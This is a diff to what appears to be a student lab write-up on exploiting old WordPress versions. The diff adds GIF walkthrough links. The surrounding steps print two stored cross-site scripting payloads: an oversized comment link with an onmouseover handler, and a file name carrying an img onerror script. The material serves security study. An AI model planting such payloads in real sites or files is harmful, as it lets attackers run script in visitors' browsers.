@@ -13,6 +13,7 @@ Time spent: Approximately 10 hours spent in total
     - Fixed in version: 	4.2.1
   - [x] GIF Walkthrough: 	
   	- exploit1/exploit1.gif
+	- https://i.imgur.com/aUbnuQ9.gifv
   - [x] Steps to recreate: 	
   	- Go to wordpress site and paste this link in the comment box and post.<a title='xonmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
 
@@ -26,6 +27,7 @@ Time spent: Approximately 10 hours spent in total
     - Fixed in version: 	4.2.15
   - [x] GIF Walkthrough:	
   	- exploit2/exploit2.gif
+	- https://i.imgur.com/MfEEiHw.gifv
   - [x] Steps to recreate:
   	- Create a file larger than 20MB in size.
 	- Rename it to "anyName <img src=x onerror=alert("Exploit2")>.jpg"
